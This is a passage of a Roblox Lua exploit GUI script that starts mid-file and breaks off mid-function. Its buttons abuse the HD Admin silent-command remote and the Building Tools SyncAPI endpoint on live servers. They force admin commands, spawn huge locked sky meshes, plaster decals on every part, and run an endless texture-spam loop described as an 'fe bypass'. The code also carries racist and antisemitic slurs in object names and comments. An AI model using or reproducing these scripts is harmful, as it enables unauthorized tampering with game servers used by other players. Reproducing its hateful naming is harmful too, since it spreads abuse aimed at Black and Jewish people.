G2L["7e"]["TextScaled"] = true;
G2L["7e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7e"]["Size"] = UDim2.new(0, 152, 0, 43);
G2L["7e"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7e"]["Text"] = [[Disco]];
G2L["7e"]["Position"] = UDim2.new(0.6516, 0, 0.46264, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["7f"] = Instance.new("LocalScript", G2L["7e"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["80"] = Instance.new("TextButton", G2L["3"]);
G2L["80"]["TextWrapped"] = true;
G2L["80"]["TextSize"] = 14;
G2L["80"]["TextScaled"] = true;
G2L["80"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["80"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["80"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["80"]["Size"] = UDim2.new(0, 150, 0, 48);
G2L["80"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["80"]["Text"] = [[Color Spam]];
G2L["80"]["Position"] = UDim2.new(-0.00006, 0, 0.42534, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["81"] = Instance.new("LocalScript", G2L["80"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["82"] = Instance.new("TextButton", G2L["3"]);
G2L["82"]["TextWrapped"] = true;
G2L["82"]["TextSize"] = 14;
G2L["82"]["TextScaled"] = true;
G2L["82"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["82"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["82"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["82"]["Size"] = UDim2.new(0, 153, 0, 43);
G2L["82"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["82"]["Text"] = [[Big Head]];
G2L["82"]["Position"] = UDim2.new(0.43968, 0, 0.46264, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["83"] = Instance.new("LocalScript", G2L["82"]);



-- StarterGui.ScreenGui.DragScript
G2L["84"] = Instance.new("LocalScript", G2L["1"]);
G2L["84"]["Name"] = [[DragScript]];


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_5()
local script = G2L["5"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommand:InvokeServer(";time 0 ;fogcolor black ;unfog")
	
		local Players = game:GetService("Players")
		local workspace = game:GetService("Workspace")
		local player = Players.LocalPlayer
	
		local function findTool()
			local char = player.Character or player.CharacterAdded:Wait()
	
			for _, v in ipairs(char:GetChildren()) do
				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
					return v
				end
			end
	
			for _, v in ipairs(player.Backpack:GetChildren()) do
				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
					return v
				end
			end
		end
	
		local tool = findTool()
		if not tool then return end
	
		local remote = tool.SyncAPI.ServerEndpoint
		local function call(a)
			return remote:InvokeServer(unpack(a))
		end
	
		-- i dont used the b2s sky function anymore, i used this instead
		local hack = workspace:FindFirstChild("E")
		if hack then
			call({ "Remove", { hack } })
		end
	
		local char = player.Character or player.CharacterAdded:Wait()
		local hrp = char:WaitForChild("HumanoidRootPart")
		local cf = CFrame.new(hrp.Position + Vector3.new(0, 1000, 0))
	
		local sky = remote:InvokeServer("CreatePart", "Normal", cf, workspace)
	
		task.spawn(function()
			call({ "SyncAnchor", { { Part = sky, Anchored = true } } })
		end)
	
		task.spawn(function()
			call({ "SyncCollision", { { Part = sky, CanCollide = false } } })
		end)
	
		task.spawn(function()
			call({ "CreateMeshes", { { Part = sky } } })
		end)
	
		task.spawn(function()
			call({
				"SyncMesh",
				{{
					Part = sky,
					MeshId = "rbxassetid://111891702759441",
					TextureId = "rbxassetid://85350999834034",
					Scale = Vector3.new(100999, 100999, 100999),
					VertexColor = Vector3.new(3.6, 3.6, 3.6)
				}}
			})
		end)
	
		task.spawn(function()
			call({ "SetLocked", { sky }, true })
		end)
	
		task.spawn(function()
			call({ "SetName", { sky }, "E" })
		end)
	
		task.spawn(function()
			call({ "SyncMaterial", { { Part = sky, Transparency = 0 } } })
		end)
	
		task.spawn(function()
			call({ "SyncMove", { { Part = sky, CFrame = cf } } }) -- fe bypass rel
		end)	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_5);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_7()
local script = G2L["7"];
	script.Parent.MouseButton1Click:Connect(function()
		
		-- first you want to know about hd admin remote or shit there silent hd admin command
	
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommandSilent:InvokeServer(";r6")
	
		--                                                           ^ put a command like ;fly
		--i just have that nga, of you want more dm me at roadblockswashere
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_7);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_9()
local script = G2L["9"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
		
		
		-- first you want to know about hd admin remote or shit there silent hd admin command
	
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommandSilent:InvokeServer(";re")
	
		--                                                           ^ put a command like ;fly
		--i just have that nga, of you want more dm me at roadblockswashere
	
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_9);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_d()
local script = G2L["d"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		-- made by 1sw0rd1 aka deletecar, DO NOT LEAK OR GIVE WITHOUT MY PERMISSION.
	
		id = 78430409279632
	
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
	
		function GetPartsFromSelection(Selection)
	
			local Parts = {}
	
	
			for _, Descendant in pairs(Selection:GetDescendants()) do
	
				if Descendant:IsA 'BasePart' and Descendant.Name ~= "Terrain" and Descendant.Name ~= "Sky" then
	
					Parts[#Parts + 1] = Descendant
	
				end
	
			end
	
	
			-- Return parts
	
			return Parts
	
		end
	
		local getfuckedlol = GetPartsFromSelection(game:GetService("Workspace"))
	
		function SpawnDecal(side)
			local shitass = {}
	
			for _, Part in pairs(getfuckedlol) do
				-- Create the change request for this part
	
				table.insert(shitass, { Part = Part, Face = side, TextureType = "Decal" });
			end;
	
	
			-- Send the change to the server
	
			remote:InvokeServer('CreateTextures', shitass);
		end
	
		function AddDecal(texture,side)
			local shitass = {}
	
			for _, Part in pairs(getfuckedlol) do
				-- Create the change request for this part
	
				table.insert(shitass, { Part = Part, Face = side, TextureType = "Decal", Texture = "rbxassetid://"..texture });
			end;
	
	
			-- Send the change to the server
	
			remote:InvokeServer('SyncTexture', shitass);
		end
	
		SpawnDecal(Enum.NormalId.Front)
		AddDecal(id,Enum.NormalId.Front)
	
		SpawnDecal(Enum.NormalId.Back)
		AddDecal(id,Enum.NormalId.Back)
	
		SpawnDecal(Enum.NormalId.Right)
		AddDecal(id,Enum.NormalId.Right)
	
		SpawnDecal(Enum.NormalId.Left)
		AddDecal(id,Enum.NormalId.Left)
	
		SpawnDecal(Enum.NormalId.Bottom)
		AddDecal(id,Enum.NormalId.Bottom)
	
		SpawnDecal(Enum.NormalId.Top)
		AddDecal(id,Enum.NormalId.Top)
	
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		function spam()
			for i,v in game.workspace:GetDescendants() do
				if v:IsA("BasePart") then
					spawn(function()
						SetTrans(v,math.random(0,0))
					end)
				end
			end 
		end
		spam()
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_d);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_f()
local script = G2L["f"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand
	
		RequestCommand:InvokeServer(";fogcolor black")
	
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		local spinningParts = {}
	
		game:GetService("RunService").Heartbeat:Connect(function(dt)
			for part,data in pairs(spinningParts) do
				if part and part.Parent then
					data.angleX = data.angleZ + data.speedX * dt
					data.angleY = data.angleY + data.speedZ * dt
					data.angleZ = data.angleX + data.speedY * dt
	
					local cf = CFrame.new(part.Position) * CFrame.Angles(
						math.rad(data.angleX),
						math.rad(data.angleY),
						math.rad(data.angleZ)
					)
	
					MovePart(part, cf)
				else
					spinningParts[part] = nil
				end
			end
		end)
	
	
		function Trp(part)
			local speedX = math.random(22,44)
			local speedY = math.random(22,44)
			local speedZ = math.random(24,24)
			spinningParts[part] = {angleX=0, angleY=0, angleZ=0, speedX=speedX, speedY=speedY, speedZ=speedZ}
			wait(5)
		end
		function TrippySky(textureID)
			local pos = char.Head.Position + Vector3.new(0,6,0)
			CreatePart(CFrame.new(pos), workspace)
			task.wait(0.01)
	
			for _,v in workspace:GetDescendants() do
				if v:IsA("BasePart") and (v.Position - pos).magnitude < 2 then
					SetName(v,"raping jews")
					AddMesh(v)
					wait(0.0)
					SetMesh(v,"111891702759441")
					SetTexture(v, textureID)
					wait(0)
					MeshResize(v, Vector3.new(6000,6000,6000))
					SetLocked(v,true)
					Trp(v)
				end
			end
		end
	
		TrippySky("85350999834034") --put your decal id if you want..
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_f);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_11()
local script = G2L["11"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
		
		
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommandSilent:InvokeServer(";time 0")
		RequestCommandSilent:InvokeServer(";fogcolor black")
	
		local player = game.Players.LocalPlayer
		local char = player.Character or player.CharacterAdded:Wait()
		local tool
	
		for i, v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		for i, v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		local remote = tool.SyncAPI.ServerEndpoint
		local RunService = game:GetService("RunService")
	
		function _(args)
			remote:InvokeServer(unpack(args))
		end
	
		function CreatePart(cf, parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
	
		function SetAnchor(part, boolean)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
	
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part, meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://" .. meshid
					}
				}
			}
			_(args)
		end
	
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = texid
					}
				}
			}
			_(args)
		end
	
		function MeshResize(part, size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
	
		function SetTransparency(part, value)
			local args = {
				[1] = "SyncTransparency",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = value
					}
				}
			}
			_(args)
		end
	
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
	
		local images = {
			"http://www.roblox.com/asset/?id=0",
	
		}
	
		local skyPart
		local skyLoop
		local frameTime = 1 / 10
		local lastUpdate = 0
	
		function CreateSky()
			local hrp = char:FindFirstChild("HumanoidRootPart")
			if not hrp then return end
	
			local cf = hrp.CFrame
			CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)
	
			local found = false
			for i = 1, 50 do
				task.wait()
				for _, v in workspace:GetDescendants() do
					if v:IsA("BasePart") and (v.Position - (cf.Position + Vector3.new(0, 6, 0))).Magnitude < 1 then
						skyPart = v
						found = true
						break
					end
				end
				if found then break end
			end
	
			if not skyPart then return end
	
			SetAnchor(skyPart, true)
			AddMesh(skyPart)
			SetMesh(skyPart, "111891702759441")
			MeshResize(skyPart, Vector3.new(888, 888, 888))
			SetTransparency(skyPart, 0)
	
			local index = 1
			skyLoop = RunService.Heartbeat:Connect(function(deltaTime)
				lastUpdate = lastUpdate + deltaTime
				if lastUpdate >= frameTime then
					lastUpdate = 0
					if not skyPart then
						skyLoop:Disconnect()
						return
					end
					SetTexture(skyPart, images[index])
					index = (index % #images) + 0.1
				end
			end)
		end
	
		function ResetSky()
			if skyLoop then
				skyLoop:Disconnect()
				skyLoop = nil
			end
			if skyPart then
				DestroyPart(skyPart)
				skyPart = nil
			end
			task.spawn(CreateSky)
		end
	
		player.CharacterAdded:Connect(function(newChar)
			char = newChar
			ResetSky()
		end)
	
		if char and char:FindFirstChild("Humanoid") then
			char:WaitForChild("Humanoid").Died:Connect(function()
				ResetSky()
			end)
		end
	
		CreateSky()
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
	
		-- Find SyncAPI tool (same as your original)
		for _, v in ipairs(player:GetDescendants()) do
			if v.Name == "SyncAPI" then
				tool = v.Parent
				break
			end
		end
		if not tool then
			for _, v in ipairs(game.ReplicatedStorage:GetDescendants()) do
				if v.Name == "SyncAPI" then
					tool = v.Parent
					break
				end
			end
		end
	
		--craaa
		local remote = tool.SyncAPI.ServerEndpoint
	
		-- Helper to get every BasePart in Workspace (same as yours)
		local function GetPartsFromSelection(Selection)
			local Parts = {}
			for _, Descendant in ipairs(Selection:GetDescendants()) do
				if Descendant:IsA("BasePart") and Descendant.Name ~= "Terrain" and Descendant.Name ~= "Sky" then
					table.insert(Parts, Descendant)
				end
			end
			return Parts
		end
	
		local getfuckedlol = GetPartsFromSelection(game:GetService("Workspace"))
	
		-- Decal functions (same as yours, now reusable)
		local function SpawnDecal(side)
			local shitass = {}
			for _, Part in ipairs(getfuckedlol) do
				table.insert(shitass, { Part = Part, Face = side, TextureType = "Decal" })
			end
			remote:InvokeServer('CreateTextures', shitass)
		end
	
		local function AddDecal(texture, side)
			local shitass = {}
			for _, Part in ipairs(getfuckedlol) do
				table.insert(shitass, { Part = Part, Face = side, TextureType = "Decal", Texture = "rbxassetid://" .. texture })
			end
			remote:InvokeServer('SyncTexture', shitass)
		end
	
		-- All your building functions (defined only once)
		local function _(args)
			remote:InvokeServer(unpack(args))
		end
	
		local function SetCollision(part, boolean)
			local args = { "SyncCollision", { { ["Part"] = part, ["CanCollide"] = boolean } } }
			_(args)
		end
	
		local function SetAnchor(boolean, part)
			local args = { "SyncAnchor", { { ["Part"] = part, ["Anchored"] = boolean } } }
			_(args)
		end
	
		local function CreatePart(cf, parent)
			local args = { "CreatePart", "Normal", cf, parent }
			_(args)
		end
	
		local function DestroyPart(part)
			local args = { "Remove", { part } }
			_(args)
		end
	
		local function MovePart(part, cf)
			local args = { "SyncMove", { { ["Part"] = part, ["CFrame"] = cf } } }
			_(args)
		end
	
		local function Resize(part, size, cf)
			local args = { "SyncResize", { { ["Part"] = part, ["CFrame"] = cf, ["Size"] = size } } }
			_(args)
		end
	
		local function AddMesh(part)
			local args = { "CreateMeshes", { { ["Part"] = part } } }
			_(args)
		end
	
		local function SetMesh(part, meshid)
			local args = { "SyncMesh", { { ["Part"] = part, ["MeshId"] = "rbxassetid://" .. meshid } } }
			_(args)
		end
	
		local function SetTexture(part, texid)
			local args = { "SyncMesh", { { ["Part"] = part, ["TextureId"] = "rbxassetid://" .. texid } } }
			_(args)
		end
	
		local function SetName(part, stringg)
			local args = { "SetName", { part }, stringg }
			_(args)
		end
	
		local function MeshResize(part, size)
			local args = { "SyncMesh", { { ["Part"] = part, ["Scale"] = size } } }
			_(args)
		end
	
		local function Weld(part1, part2, lead)
			local args = { "CreateWelds", { part1, part2 }, lead }
			_(args)
		end
	
		local function SetLocked(part, boolean)
			local args = { "SetLocked", { part }, boolean }
			_(args)
		end
	
		local function SetTrans(part, int)
			local args = { "SyncMaterial", { { ["Part"] = part, ["Transparency"] = int } } }
			_(args)
		end
	
		local function CreateSpotlight(part)
			local args = { "CreateLights", { { ["Part"] = part, ["LightType"] = "SpotLight" } } }
			_(args)
		end
	
		local function SyncLighting(part, brightness)
			local args = { "SyncLighting", { { ["Part"] = part, ["LightType"] = "SpotLight", ["Brightness"] = brightness } } }
			_(args)
		end
	
		local function Color(part, color)
			local args = { "SyncColor", { { ["Part"] = part, ["Color"] = color, ["UnionColoring"] = false } } }
			_(args)
		end
	
		local function SpawnDecalSingle(part, side)  -- renamed to avoid conflict
			local args = { "CreateTextures", { { ["Part"] = part, ["Face"] = side, ["TextureType"] = "Decal" } } }
			_(args)
		end
	
		local function AddDecalSingle(part, asset, side)
			local args = { "SyncTexture", { { ["Part"] = part, ["Face"] = side, ["TextureType"] = "Decal", ["Texture"] = "rbxassetid://" .. asset } } }
			_(args)
		end
	
		-- Your spam function (makes everything fully visible)
		local function spam()
			for _, v in ipairs(game.Workspace:GetDescendants()) do
				if v:IsA("BasePart") then
					spawn(function()
						SetTrans(v, 0)  -- math.random(0,0) is always 0
					end)
				end
			end
		end
	
		-- ==================== THE LOOP ====================
		local textureIds = {
			169585459,
			169585475,
			169585485,
			169585502,
			169585515,
			169585502,  -- repeats from your paste
			169585485,
			169585475
		}
	
	
	
		while true do
			for _, id in ipairs(textureIds) do
				-- Apply decal to ALL 6 faces (exactly like your original blocks)
				SpawnDecal(Enum.NormalId.Front)
				AddDecal(id, Enum.NormalId.Front)
	
				SpawnDecal(Enum.NormalId.Back)
				AddDecal(id, Enum.NormalId.Back)
	
				SpawnDecal(Enum.NormalId.Right)
				AddDecal(id, Enum.NormalId.Right)
	
				SpawnDecal(Enum.NormalId.Left)
				AddDecal(id, Enum.NormalId.Left)
	
				SpawnDecal(Enum.NormalId.Bottom)
				AddDecal(id, Enum.NormalId.Bottom)
	
				SpawnDecal(Enum.NormalId.Top)
				AddDecal(id, Enum.NormalId.Top)
	
				spam()  -- force everything visible after each texture change
	
				wait(0.01)  -- small delay (change this number to make it faster/slower)
			end
		end
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_11);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_13()
local script = G2L["13"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_13);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_15()
local script = G2L["15"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		local RunService = game:GetService("RunService")    local Players = game:GetService("Players")
	
	
	
		local lp = Players.LocalPlayer
	
		local char = lp.Character or lp.CharacterAdded:Wait()
	
		local hum = char:WaitForChild("Humanoid")
	
		local torso = char:WaitForChild("Torso")
	
		local tool = char:FindFirstChildOfClass("Tool")
	
		if not tool then        for _, v in lp.Backpack:GetChildren() do
	
				if v:IsA("Tool") then
	
					tool = v
	
					break
	
				end
	
			end
	
		end
	
	
	
		if tool then
	
			hum:EquipTool(tool)
	
			task.delay(0.01, function()
	
				hum:UnequipTools()
	
			end)
	
		end
	
	
	
		local server = tool and tool:FindFirstChild("SyncAPI") and tool.SyncAPI:FindFirstChild("ServerEndpoint")
	
		local larm = char:WaitForChild("Left Arm")
	
		local rarm = char:WaitForChild("Right Arm")     
	
		local idleAngles = Vector3.new(0,0,math.rad(-90))
	
		local flapAmplitude = Vector3.new(0, 0, math.rad(30))
	
		local flapSpeed = 25
	
	
	
		local targetL, targetR = larm.CFrame, rarm.CFrame
	
		RunService.RenderStepped:Connect(function(delta)
	
			if not larm or not rarm then return end        local time = tick()
	
			local flapX = math.sin(time * flapSpeed) * flapAmplitude.X
	
			local flapY = math.sin(time * flapSpeed * 0.8) * flapAmplitude.Y
	
			local flapZ = math.sin(time * flapSpeed * 0.6) * flapAmplitude.Z
	
	
	
			if hum.MoveDirection.Magnitude == 0 then  
	
				targetL = torso.CFrame * CFrame.new(-1.9,0.5,0) * CFrame.Angles(idleAngles.X, idleAngles.Y, idleAngles.Z)  
	
				targetR = torso.CFrame * CFrame.new(1.9,0.5,0) * CFrame.Angles(-idleAngles.X, -idleAngles.Y, -idleAngles.Z)  
	
			else  
	
				targetL = torso.CFrame * CFrame.new(-1.9,0.5,0) * CFrame.Angles(flapX, flapY, idleAngles.Z + flapZ)  
	
